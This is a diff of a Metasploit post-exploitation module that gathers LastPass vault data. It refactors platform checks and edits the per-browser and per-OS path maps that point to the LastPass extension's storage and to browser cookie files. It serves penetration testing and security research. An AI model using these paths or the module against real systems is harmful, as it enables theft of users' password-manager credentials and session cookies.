@@ -1,12 +1,10 @@
 ##
-# This module requires Metasploit: http://metasploit.com/download
+# This module requires Metasploit: https://metasploit.com/download
 # Current source: https://github.com/rapid7/metasploit-framework
 ##
 
-require 'msf/core'
 require 'sqlite3'
 require 'uri'
-require 'rex'
 
 class MetasploitModule < Msf::Post
   include Msf::Post::File
@@ -38,7 +36,7 @@ class MetasploitModule < Msf::Post
   end
 
   def run
-    if session.platform =~ /win/ && session.type == "shell" # No Windows shell support
+    if session.platform == 'windows' && session.type == "shell" # No Windows shell support
       print_error "Shell sessions on Windows are not supported"
       return
     end
@@ -68,7 +66,6 @@ class MetasploitModule < Msf::Post
 
   # Returns a mapping of lastpass accounts
   def build_account_map
-    platform = session.platform
     profiles = user_profiles
     account_map = {}
 
@@ -78,8 +75,8 @@ class MetasploitModule < Msf::Post
       localstorage_path_map = {}
       cookies_path_map = {}
 
-      case platform
-      when /win/
+      case session.platform
+      when 'windows'
         browser_path_map = {
           'Chrome' => "#{user_profile['LocalAppData']}\\Google\\Chrome\\User Data\\Default\\databases\\chrome-extension_hdokiejnpimakedhajhdlcegeplioahd_0",
           'Firefox' => "#{user_profile['AppData']}\\Mozilla\\Firefox\\Profiles",
@@ -98,7 +95,7 @@ class MetasploitModule < Msf::Post
           'IE' => "#{user_profile['LocalAppData']}\\Microsoft\\Windows\\INetCookies\\Low",
           'Opera' => "#{user_profile['AppData']}\\Opera Software\\Opera Stable\\Cookies"
         }
-      when /unix|linux/
+      when 'unix', 'linux'
         browser_path_map = {
           'Chrome' => "#{user_profile['LocalAppData']}/.config/google-chrome/Default/databases/chrome-extension_hdokiejnpimakedhajhdlcegeplioahd_0",
           'Firefox' => "#{user_profile['LocalAppData']}/.mozilla/firefox",
@@ -114,7 +111,7 @@ class MetasploitModule < Msf::Post
           'Firefox' => "", # It's set programmatically
           'Opera' => "#{user_profile['LocalAppData']}/.config/opera/Cookies"
         }
-      when /osx/
+      when 'osx'
         browser_path_map = {
           'Chrome' => "#{user_profile['LocalAppData']}/Google/Chrome/Default/databases/chrome-extension_hdokiejnpimakedhajhdlcegeplioahd_0",
           'Firefox' => "#{user_profile['LocalAppData']}/Firefox/Profiles",
@@ -134,7 +131,7 @@ class MetasploitModule < Msf::Post
           'Safari' => "#{user_profile['AppData']}/Cookies/Cookies.binarycookies"
         }
       else
-        print_error "Platform not recognized: #{platform}"
+        print_error "Platform not recognized: #{session.platform}"
       end
 
       account_map[account] = {}
@@ -194,10 +191,10 @@ class MetasploitModule < Msf::Post
           "LocalAppData" => "/Users/#{user_name}/Library/Application Support"
         )
       end
-    when /win/
+    when /windows/
       user_profiles |= grab_user_profiles
     else
-      print_error "OS not recognized: #{os}"
+      print_error "OS not recognized: #{session.platform}"
     end
     user_profiles
   end
@@ -807,6 +804,6 @@ class MetasploitModule < Msf::Post
 
   # Returns OS separator in a session type agnostic way
   def system_separator
-    return session.platform =~ /win/ ? '\\' : '/'
+    return session.platform == 'windows' ? '\\' : '/'
   end
 end
